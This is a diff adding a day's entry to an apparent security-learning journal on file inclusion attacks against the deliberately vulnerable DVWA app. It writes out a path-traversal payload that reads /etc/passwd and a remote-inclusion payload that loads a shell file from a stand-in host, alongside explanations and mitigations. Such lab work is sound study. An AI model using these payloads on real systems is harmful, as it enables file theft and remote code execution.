@@ -376,3 +376,82 @@ Key Concepts Learned
 -- CSRF exploits authenticated sessions  
 -- Lack of request validation leads to vulnerability   
 
+Day 29 - File Inclusion Attacks (LFI & RFI)
+
+-- Performed Local File Inclusion (LFI) and Remote File Inclusion (RFI) attacks to access sensitive files and execute external code  
+
+Objective
+
+-- Understand file inclusion vulnerabilities  
+-- Perform Local File Inclusion (LFI)  
+-- Perform Remote File Inclusion (RFI)  
+-- Analyze impact and mitigation techniques  
+
+Tools Used
+
+-- Kali Linux  
+-- DVWA (Damn Vulnerable Web App)  
+-- Web Browser  
+
+Setup
+
+-- DVWA Security Level set to LOW  
+
+What is File Inclusion?
+
+-- Allows attacker to include files through user input  
+-- Can expose sensitive data or execute malicious code  
+
+Part 1 = Local File Inclusion (LFI)
+
+Step 1:
+-- Go to:
+   File Inclusion module  
+
+Step 2:
+-- Modify URL parameter:
+
+   page=../../../../etc/passwd  
+
+Result:
+-- Displays system file (/etc/passwd)  
+
+Explanation (LFI)
+
+-- Application includes file directly from system  
+-- Path traversal used to access sensitive files  
+
+
+Part 2 – Remote File Inclusion (RFI)
+
+Step 1:
+-- Use external URL:
+
+   page=http://example.com/shell.txt  
+
+Result:
+-- Executes remote file content  
+
+Explanation (RFI)
+
+-- Application allows external file inclusion  
+-- Attacker can execute malicious code  
+
+Security Impact
+
+-- Exposure of sensitive system files  
+-- Remote code execution  
+-- Full system compromise  
+
+Mitigation Techniques
+
+-- Validate user input  
+-- Restrict file paths  
+-- Disable allow_url_include  
+-- Use whitelisting for files  
+
+Key Concepts Learned
+
+-- Path traversal attacks  
+-- Difference between LFI and RFI  
+-- Risk of insecure file handling  
